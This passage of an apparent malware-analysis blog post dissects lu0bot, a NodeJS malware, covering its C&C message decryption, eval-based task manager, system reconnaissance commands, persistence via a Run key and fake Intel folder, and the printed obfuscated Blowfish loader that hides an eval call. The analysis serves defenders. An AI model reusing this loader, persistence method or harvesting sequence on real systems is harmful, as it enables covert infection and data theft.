        type: 'upload',          # Upload/Download type
        hn: 'bufread',           # Handle name called
        target: 'binit',         # Script name called (From C&amp;C)
        fp: ,                    # Buffer
        size: ,                  # Size
        fcb: &#91;Function],         # FailCallBack
        rcb: &#91;Function],         # ???
        interval: 200,           # Internval Timer
        last_sev: 1622641866909, # Last Timer Event
        stmr: false              # Script Timer
}</code></pre>



<h2 class="wp-block-heading">Ingenious trick for calling functions dynamically</h2>



<p>Usually, when you are reversing malware, you are always confronted (or almost every time) about maldev hiding API Calls with tricks like <strong><em><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" data-type="URL" data-id="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a></em></strong> or <em><strong>Hashing</strong></em>.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>function sc(m, r) {
    if (!m || m.length &lt; 34) return;
    m[16] ^= m[2];
    m[17] ^= m[3];
    var l = m.readUInt16BE(16);
    if (18 + l &gt; m.length) return;
    var ko = s.pk[r.address + &#39; &#39; + r.port];
    var c = crypto.createDecipheriv(&#39;aes-128-cbc&#39;, ko.k, m.slice(0, 16));
    m = Buffer.concat([c.update(m.slice(18, 18 + l)), c.final()]);
    m = {
        q: m.readUInt32BE(0),
        c: m.readUInt16BE(4),
        ko: ko,
        d: m.slice(6)
    };
    l = &#39;c&#39; + m.c;        // Function name is now saved
    if (s[l]) s[l](m, r);
}</code></pre></div>



<p><br>As someone that is not really experienced in the NodeJS environment, I wasn&#8217;t really triggering the trick performed here but for web dev, I would believe this is likely obvious (or maybe I&#8217;m wrong). The thing that you need to really take attention to is what is happening with &#8220;c&#8221; char and <strong>m.c</strong>.</p>



<p>By reading the official NodeJs documemtation: The <strong>Buffer.readUInt16BE()</strong> method is an inbuilt application programming interface of class Buffer within the Buffer module which is used to read 16-bit value from an allocated buffer at a specified offset.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>Buffer.readUInt16BE( offset )</code></pre></div>



<p>In this example it will return in a real case scenario the value &#8220;1&#8221;, so with the variable l, it will create &#8220;c1&#8221; , a function stored into the global variable s. In the end, <strong>s[&#8220;c1&#8221;](m,r) </strong>is also meaning<strong> s.c1(m,r).</strong></p>



<h2 class="wp-block-heading">A well-done task manager architecture</h2>



<h3 class="wp-block-heading">Q variable used as Macro PoV Task Manager</h3>



<ul class="wp-block-list"><li>&#8220;Q&#8221; is designed to be the main task manager.</li><li>If Q value is not on LQ, adding it into LQ stack, then executing the code content (with <strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval</a></strong>) from m (message). </li></ul>



<pre class="wp-block-code"><code>if (!lq&#91;q]) {                               // if query not in the queue, creating it
    lq&#91;q] = &#91;0, false];
    setTimeout(function() {
        delete lq&#91;q]
    }, 30000);
    try {
        for (var p = 0; p &lt; m.d.length; p++)
            if (!m.d&#91;p]) break;
        var es = m.d.slice(0, p).toString(); // es -&gt; Execute Script
        m.d = m.d.slice(p + 1);
        if (!m.d.length) m.d = false;
        eval(es)                             // eval, our sweat eval...
    } catch (e) {
        console.log(e);
    }
    return;
}
if (lq&#91;q]&#91;0]) {
    s.ss(ko.pid, q, 1, lq&#91;q]&#91;1]);
}</code></pre>



<h3 class="wp-block-heading">MP variable used as Micro PoV Task Manager</h3>



<ul class="wp-block-list"><li>&#8220;MP&#8221; is designed to execute tasks coming from C&amp;C&#8217;s.</li><li>Each task is executed independantly! </li></ul>



<pre class="wp-block-code"><code>function mp_opnew(m) {

    var o = false;                       // o -&gt; object
    try {
        o = JSON.parse(m.d);             // m.d (message.data) is saved into o
    } catch (e) {}
    if (!o || !o.id) return c1r(m, -1);  // if o empty, or no id, returning -1 
    if (!ko.h&#91;o.hn]) return c1r(m, -2);  // if no functions set from hn, returning -2
    var mp = ko.mp_new(o.id);            // Creating mp ---------------------------
    for (var k in o) mp&#91;k] = o&#91;k];                                                |
    var hr = ko.h&#91;o.hn](mp);                                                      |
    if (!hr) {                                                                    |
        ko.mp_del(mp);                                                            |
        return c1r(m, -3)                // if hr is incomplete, returning -3     |
    }                                                                             |
    c1r(m, hr);                          // returning hr                          |                                                                                             
}                                                                                 |
                                                                                  |
function mp_new(id, ivl) {    &lt;----------------------------------------------------
    var ivl = ivl ? ivl : 5000;          // ivl -&gt; interval
    var now = Date.now();        
    if (!lmp&#91;id]) lmp&#91;id] = {            // mp list 
        id: id,
        pid: ko.pid,
        gen: now,
        last: now,
        tmr: false,
        p: {},
        psz: 0,
        btotal: 0
    };
    var mp = lmp&#91;id];
    if (!mp.tmr) mp.tmr = setInterval(function() {
        if (Date.now() - mp.last &gt; 1000 * 120) {
            ko.mp_del(id);
            return;
        }
        if (mp.tcb) mp.tcb(mp);
    }, ivl);
    mp.last = now;
    return mp;
}</code></pre>



<h3 class="wp-block-heading">O (Object) &#8211; C&amp;C Task </h3>



<p>This object is receiving tasks from the C&amp;C. Technically, this is (I believed) one of the most interesting variable to track with this malware..</p>



<ul class="wp-block-list"><li>It contains 4 or 5 values<ul><li><strong>type</strong>. <ul><li>upload</li><li>download</li></ul></li></ul><ul><li><strong>hn </strong>: Handle Name</li><li><strong>sz</strong>: Size (Before Zlib decompression)</li><li><strong>psz</strong>: ???</li><li><strong>target</strong>: name of the command/script received from C&amp;C</li></ul></li></ul>



<pre class="wp-block-code"><code>// o content
{ 
        id: 'XXXXXXXXXXXXXXXXX',
        type: 'upload',
        hn: 'eval',
        sz: 9730,
        psz: 1163,
        target: 'bootstrap-base.js',
} </code></pre>



<p>on this specific scenario, it&#8217;s uploading on the bot a file from the C&amp;C called &#8220;<strong>bootstrap-base.js</strong>&#8221; and it will be called with the handle name (<strong>hn</strong>) function <strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval</a></strong>.</p>



<h3 class="wp-block-heading"><strong><span style="text-decoration: underline;">Summary</span></strong></h3>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="900" height="596" data-attachment-id="3576" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/taskmanager-1/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/TaskManager-1.png?fit=1033%2C684&amp;ssl=1" data-orig-size="1033,684" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="TaskManager-1" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/TaskManager-1.png?fit=300%2C199&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/TaskManager-1.png?fit=900%2C596&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/TaskManager-1.png?resize=900%2C596&#038;ssl=1" alt="" class="wp-image-3576" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/TaskManager-1.png?resize=1024%2C678&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/TaskManager-1.png?resize=300%2C199&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/TaskManager-1.png?resize=768%2C509&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/TaskManager-1.png?w=1033&amp;ssl=1 1033w" sizes="auto, (max-width: 900px) 100vw, 900px" /></figure>



<h2 class="wp-block-heading">Aggressive telemetry harvester</h2>



<p>Usually, when malware is gathering information from a new bot it is extremely fast but here for exactly 7/8 minutes your VM/Machine is literally having a bad time.</p>



<h4 class="wp-block-heading">Preparing environment</h4>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="900" height="369" data-attachment-id="3477" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/script_dir/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_dir.png?fit=962%2C394&amp;ssl=1" data-orig-size="962,394" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="script_dir" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_dir.png?fit=300%2C123&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_dir.png?fit=900%2C369&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_dir.png?resize=900%2C369&#038;ssl=1" alt="" class="wp-image-3477" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_dir.png?w=962&amp;ssl=1 962w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_dir.png?resize=300%2C123&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_dir.png?resize=768%2C315&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /></figure>



<h4 class="wp-block-heading">Gathering system information</h4>



<h5 class="wp-block-heading">Process info</h5>



<pre class="wp-block-code"><code>tasklist /fo csv /nh
wmic process get processid,parentprocessid,name,executablepath /format:csv
qprocess *</code></pre>



<h5 class="wp-block-heading">Network info</h5>



<pre class="wp-block-code"><code>ipconfig.exe /all
route.exe print
netstat.exe -ano
systeminfo.exe /fo csv</code></pre>



<h5 class="wp-block-heading">Saving Environment &amp; User path(s)</h5>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="666" height="277" data-attachment-id="3471" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/script_get_einfo_2/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_get_einfo_2.png?fit=666%2C277&amp;ssl=1" data-orig-size="666,277" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="script_get_einfo_2" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_get_einfo_2.png?fit=300%2C125&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_get_einfo_2.png?fit=666%2C277&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_get_einfo_2.png?resize=666%2C277&#038;ssl=1" alt="" class="wp-image-3471" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_get_einfo_2.png?w=666&amp;ssl=1 666w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_get_einfo_2.png?resize=300%2C125&amp;ssl=1 300w" sizes="auto, (max-width: 666px) 100vw, 666px" /><figcaption><em>Saving environment variables EI_HOME (EI = EINFO) </em></figcaption></figure></div>



<pre class="wp-block-code"><code>EI_DESKTOP
  |--&gt; st.env&#91;'EI_HOME'] + '\\Desktop';
EI_DOCUMENTS 
  |--&gt; st.env&#91;'EI_HOME'] + '\\Documents';
  |--&gt; st.env&#91;'EI_HOME'] + '\\My Documents';
EI_PROGRAMFILES1
  |--&gt; var tdir1 = exports.env_get('ProgramFiles');
  |--&gt; var tdir2 = exports.env_get('ProgramFiles(x86)');
  |--&gt; st.env&#91;'EI_HOME'].substr(0,1) + '\\Program Files (x86)';
EI_PROGRAMFILES2
  |--&gt; var tdir3 = exports.env_get('ProgramW6432');
  |--&gt; st.env&#91;'EI_HOME'].substr(0,1) + '\\Program Files';
EI_DOWNLOADS
  |--&gt;  st.env&#91;'EI_HOME'] + '\\Downloads';</code></pre>



<h5 class="wp-block-heading">Console information</h5>



<p>These two variables are basically conditions to check if the process was performed. (<strong><em>ISCONPROBED</em></strong> is set to true when the whole thing is complete).</p>



<pre class="wp-block-code"><code>env&#91;"ISCONPROBED"] = false;
env&#91;"ISCONSOLE"] = true;</code></pre>



<p>Required values for completing the task..</p>



<pre class="wp-block-code"><code>env&#91;"WINDIR"] = val;
env&#91;"TEMP"] = val;
env&#91;"USERNAME_RUN"] = val;
env&#91;"USERNAME"] =  val;
env&#91;"USERNAME_SID"] = s;
env&#91;"ALLUSERSPROFILE"] = val;
env&#91;"APPDATA"] = val;</code></pre>



<h4 class="wp-block-heading">Checking old windows versions</h4>



<p>Curiously, it&#8217;s checking if the bot is using an old Microsoft Windows version.</p>



<ul class="wp-block-list"><li>NT 5.X &#8211; Windows 2000/XP</li><li>NT 6.0 &#8211; Vista</li></ul>



<div class="hcb_wrap"><pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>function check_oldwin(){
    var osr = os.release();

    if(osr.indexOf(&#39;5.&#39;)===0 || osr.indexOf(&#39;6.0&#39;)===0) return osr;

    return false;
}
exports.check_oldwin = check_oldwin;</code></pre></div>



<p>This is basically a condition after for using an alternative command with pslist</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>function ps_list_alt(cb){
    var cmd = [&#39;qprocess&#39;,&#39;*&#39;];
    if(check_oldwin()) cmd.push(&#39;/system&#39;);
   ....</code></pre></div>



<h4 class="wp-block-heading">Checking ADS streams for hiding content into it for later</h4>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="672" height="443" data-attachment-id="3465" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/script_ads_test/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_ads_test.png?fit=672%2C443&amp;ssl=1" data-orig-size="672,443" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="script_ads_test" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_ads_test.png?fit=300%2C198&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_ads_test.png?fit=672%2C443&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_ads_test.png?resize=672%2C443&#038;ssl=1" alt="" class="wp-image-3465" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_ads_test.png?w=672&amp;ssl=1 672w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_ads_test.png?resize=300%2C198&amp;ssl=1 300w" sizes="auto, (max-width: 672px) 100vw, 672px" /><figcaption><em>Checking Alternative Data Streams</em></figcaption></figure></div>



<h4 class="wp-block-heading">Harvesting functions 101</h4>



<pre class="wp-block-code"><code>bufstore_save(key,val,opts)         # Save Buffer Storage 
bufstore_get(key,clear)             # Get Buffer Storage 
strstrip(str)                       # String Strip
name_dirty_fncmp(f1,f2)             # Filename Compare (Dirty)
dirvalidate_dirty(file)             # Directory Checking (Dirty)
file_checkbusy(file)                # Checking if file is used
run_detached(args,opts,show)        # Executing command detached
run(args,opts,cb)                   # Run command
check_oldwin()                      # Check if Bot OS is NT 5.0 or NT 6.0
ps_list_alt(cb)                     # PS List (Alternative way)
ps_list_tree(list,results,opts,pid) # PS List Tree
ps_list(arg,cb)                     # PS list 
ps_exist(pid)                       # Check if PID Exist
ps_kill(pid)                        # Kill PID
reg_get_parse(out)                  # Parsing Registry Query Result
reg_hkcu_get()                      # Get HKCU
reg_hkcu_replace(path)              # Replace HKCU Path
reg_get(key,cb)                     # Get Content
reg_get_dir(key,cb)                 # Get Directory
reg_get_key(key,cb)                 # Get SubKey
reg_set_key(key,value,type,cb)      # Set SubKey
reg_del_key(key,force,cb)           # Del SubKey
get_einfo_1(ext,cb)                 # Get EINFO Step 1
dirlistinfo(dir,limit)              # Directory Listing info 
get_einfo_2(fcb)                    # Get EINFO Step 2
env_get(key,kv,skiple)              # Get Environment
console_get(cb)                     # Get Console environment variables
console_get_done(cb,err)            # Console Try/Catch callback
console_get_s0(ccb)                 # Console Step 0
console_get_s1(ccb)                 # Console Step 1
console_get_s2(ccb)                 # Console Step 2
console_get_s3(ccb)                 # Console Step 3
ads_test()                          # Checking if bot is using ADS streams
diskser_get_parse(dir,out)          # Parse Disk Serial command results
diskser_get(cb)                     # Get Disk Serial
prepare_dirfile_env(file,cb)        # Prepare Directory File Environment
prepare_file_env(file,cb)           # Prepare File Environment
hash_md5_var(val)                   # MD5 Checksum
getosinfo()                         # Get OS Information
rand(min, max)                      # Rand() \o/
ipctask_start()                     # IPC Task Start (Interprocess Communication)
ipctask_tick()                      # IPC Task Tick (Interprocess Communication)
baseinit_s0(cb)                     # Baseinit Step 0
baseinit_s1(cb)                     # Baseinit Step 1
baseinit_s2(cb)                     # Baseinit Step 2
baseinit_einfo_1_2(cb)              # Baseinit EINFO</code></pre>



<h2 class="wp-block-heading">Funky Persistence </h2>



<p>The persistence is saved in the classic HKCU Run path</p>



<pre class="wp-block-code"><code><code>&#91;HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]<br>"Intel Management Engine Components 4194521778"="wscript.exe /t:30 /nologo /e:jscript \"C:\ProgramData\Intel\Intel(R) Management Engine Components\Intel MEC 750293792\" \"C:\ProgramData\Intel\Intel(R) Management Engine Components\" 2371015226"</code></code></pre>



<p>Critical files are stored into a fake &#8220;<strong><em>Intel</em></strong>&#8221; folder in <strong><em>ProgramData</em></strong>.</p>



<pre class="wp-block-code"><code>ProgramData
    |-- Intel
        |--  Intel(R) Management Engine Components
            |--&gt; Intel MEC 246919961
            |--&gt; Intel MEC 750293792</code></pre>



<h4 class="wp-block-heading">Intel MEC 750293792</h4>



<div class="hcb_wrap"><pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>new ActiveXObject(&quot;WScript.shell&quot;).Run(&#39;&quot;C:\ProgramData\DNTException\node.exe&quot; &quot;&#39; + WScript.Arguments(0) + &#39;\Intel MEC 246919961&quot; &#39; + WScript.Arguments(1), 0, false);</code></pre></div>



<h4 class="wp-block-heading">Intel MEC 246919961</h4>



<div class="hcb_wrap"><pre class="prism line-numbers lang-js" data-lang="JavaScript"><code>var c = new Buffer((process.argv[2] + 38030944).substr(0, 8));
c = require(&quot;crypto&quot;).createDecipheriv(&quot;bf&quot;, c, c);
global[&quot;\x65\x76&quot; + &quot;\x61\x6c&quot;](Buffer.concat([c.update(new Buffer(&quot;XSpPi1eP/0WpsZRcbNXtfiw8cHqIm5HuTgi3xrsxVbpNFeB6S6BXccVSfA/JcVXWdGhhZhJf4wHv0PwfeP1NjoyopLZF8KonEhv0cWJ7anho0z6s+0FHSixl7V8dQm3DTlEx9zw7nh9SGo7MMQHRGR63gzXnbO7Z9+n3J75SK44dT4fNByIDf4rywWv1+U7FRRfK+GPmwwwkJWLbeEgemADWttHqKYWgEvqEwrfJqAsKU/TS9eowu13njTAufwrwjqjN9tQNCzk5olN0FZ9Cqo/0kE5+HWefh4f626PAubxQQ52X+SuUqYiu6fiLTNPlQ4UVYa6N61tEGX3YlMLlPt9NNulR8Q1phgogDTEBKGcBlzh9Jlg3Q+2Fp84z5Z7YfQKEXkmXl/eob8p4Putzuk0uR7/+Q8k8R2DK1iRyNw5XIsfqhX3HUhBN/3ECQYfz+wBDo/M1re1+VKz4A5KHjRE+xDXu4NcgkFmL6HqzCMIphnh5MZtZEq+X8NHybY2cL1gnJx6DsGTU5oGhzTh/1g9CqG6FOKTswaGupif+mk1lw5GG2P5b5w==&quot;, &quot;\x62\x61\x73&quot; + &quot;\x65\x36\x34&quot;)), c.final()]).toString());</code></pre></div>



<p>The workaround is pretty cool in the end</p>



<ul class="wp-block-list"><li><strong>WScript</strong> is launched after waiting for 30s</li><li>JScript is calling &#8220;Intel MEC 750293792&#8221; </li><li>&#8220;Intel MEC 750293792&#8221; is executing node.exe with arguments from the upper layer</li><li>This setup is triggering the script &#8220;Intel MEC 246919961&#8221;<ul><li>the Integer value from the upper layer(s) is part of the <strong>Blowfish key </strong>generation</li><li>global[&#8220;\x65\x76&#8221; + &#8220;\x61\x6c&#8221;] is in fact hiding an <strong><strong><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval</a></strong></strong> call</li><li>the encrypted buffer is storing the <strong>lu0bot NodeJS loader</strong>.</li></ul></li></ul>



<h2 class="wp-block-heading">Ongoing troubleshooting in production ?</h2>



<p>It is possible to see in some of the commands received, some lines of codes that are disabled. Unknown if it&#8217;s intended or no, but it&#8217;s pretty cool to see about what the maldev is working.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="673" height="263" data-attachment-id="3481" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/script_baseinit_s2_comments/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_baseinit_s2_comments.png?fit=673%2C263&amp;ssl=1" data-orig-size="673,263" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="script_baseinit_s2_comments" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_baseinit_s2_comments.png?fit=300%2C117&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_baseinit_s2_comments.png?fit=673%2C263&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_baseinit_s2_comments.png?resize=673%2C263&#038;ssl=1" alt="" class="wp-image-3481" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_baseinit_s2_comments.png?w=673&amp;ssl=1 673w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_baseinit_s2_comments.png?resize=300%2C117&amp;ssl=1 300w" sizes="auto, (max-width: 673px) 100vw, 673px" /></figure></div>



<p>It feels like a possible debugging scenario for understanding an issue.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="745" height="395" data-attachment-id="3482" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/script_comments/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_comments.png?fit=745%2C395&amp;ssl=1" data-orig-size="745,395" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="script_comments" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_comments.png?fit=300%2C159&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_comments.png?fit=745%2C395&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_comments.png?resize=745%2C395&#038;ssl=1" alt="" class="wp-image-3482" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_comments.png?w=745&amp;ssl=1 745w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/script_comments.png?resize=300%2C159&amp;ssl=1 300w" sizes="auto, (max-width: 745px) 100vw, 745px" /></figure></div>



<h2 class="wp-block-heading">Outdated NodeJS still living and kickin&#8217;</h2>



<p>Interestingly, lu0bot is using a very old version of node.exe, way older than could be expected.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="703" height="185" data-attachment-id="3463" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/node_version/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_version.png?fit=703%2C185&amp;ssl=1" data-orig-size="703,185" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="node_version" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_version.png?fit=300%2C79&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_version.png?fit=703%2C185&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_version.png?resize=703%2C185&#038;ssl=1" alt="" class="wp-image-3463" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_version.png?w=703&amp;ssl=1 703w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_version.png?resize=300%2C79&amp;ssl=1 300w" sizes="auto, (max-width: 703px) 100vw, 703px" /><figcaption><em>node.exe used by lu0bot is an outdated one</em></figcaption></figure></div>



<p>This build (0.10.48), <a href="https://github.com/nodejs/node/blob/master/doc/changelogs/CHANGELOG_V010.md" data-type="URL" data-id="https://github.com/nodejs/node/blob/master/doc/changelogs/CHANGELOG_V010.md">is apparently from 2016</a>, so in term of functionalities, there is a little leeway for exploiting NodeJS, due that most of its APIs wasn&#8217;t yet implemented at that time.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="900" height="304" data-attachment-id="3468" data-permalink="https://fumik0.com/2021/06/24/lu0bot-an-unknown-nodejs-malware-using-udp/node_changelog/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_changelog.png?fit=1113%2C376&amp;ssl=1" data-orig-size="1113,376" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="node_changelog" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_changelog.png?fit=300%2C101&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_changelog.png?fit=900%2C304&amp;ssl=1" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_changelog.png?resize=900%2C304&#038;ssl=1" alt="" class="wp-image-3468" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_changelog.png?resize=1024%2C346&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_changelog.png?resize=300%2C101&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_changelog.png?resize=768%2C259&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2021/06/node_changelog.png?w=1113&amp;ssl=1 1113w" sizes="auto, (max-width: 900px) 100vw, 900px" 